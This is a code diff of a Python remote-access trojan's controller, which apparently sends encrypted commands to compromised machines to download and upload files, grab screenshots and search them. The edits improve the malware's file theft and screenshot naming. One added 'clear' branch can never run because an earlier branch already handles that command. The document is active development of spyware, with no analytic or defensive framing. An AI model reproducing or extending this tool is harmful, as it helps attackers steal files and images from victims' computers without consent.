@@ -1,4 +1,5 @@
-import socket,os,subprocess,datetime
+import socket,os,subprocess
+from datetime import datetime
 from Cryptodome.PublicKey import RSA
 from Cryptodome.Cipher import PKCS1_OAEP
 
@@ -130,6 +131,7 @@ lgKFNB0WAhw9dYCLHW1wtjejOc+IaeCxdMf77NX7hO7YsJS1FIyohB1EAcXZTz7H
             packet = self.connection.recv(MAX)
             if "[-] File not found".encode() in packet:
                 print("[-] File not found")
+                f.close()
                 os.remove(filename)
                 break
             elif packet.endswith("done".encode()):
@@ -161,7 +163,8 @@ lgKFNB0WAhw9dYCLHW1wtjejOc+IaeCxdMf77NX7hO7YsJS1FIyohB1EAcXZTz7H
                 self.r_send(cmd)
                 cmd = cmd.split(' ')
                 if cmd[0] == "download":
-                    self.download(cmd[1])
+                    filename = ' '.join(cmd[1:])
+                    self.download(filename)
                 elif cmd[0] == "upload":
                     self.upload(cmd[1])
                 elif cmd[0] == "clear":
@@ -170,12 +173,14 @@ lgKFNB0WAhw9dYCLHW1wtjejOc+IaeCxdMf77NX7hO7YsJS1FIyohB1EAcXZTz7H
                     if not os.path.exists("screenshots"):
                         os.mkdir("screenshots")
                     os.chdir("screenshots")
-                    filename = str(datetime.datetime.now())
+                    filename = datetime.now().strftime("%m-%d-%Y, %Hh%Mm%Ss") + '.png'
                     self.download(filename)
                     os.chdir("..")
                 elif cmd[0] == "search" and len(cmd)>1:
                     res = self.r_recv()
                     print(res)
+                elif cmd[0] == "clear" :
+                    os.system("clear")
                 else:
                     result = self.r_recv()
                     print(result)
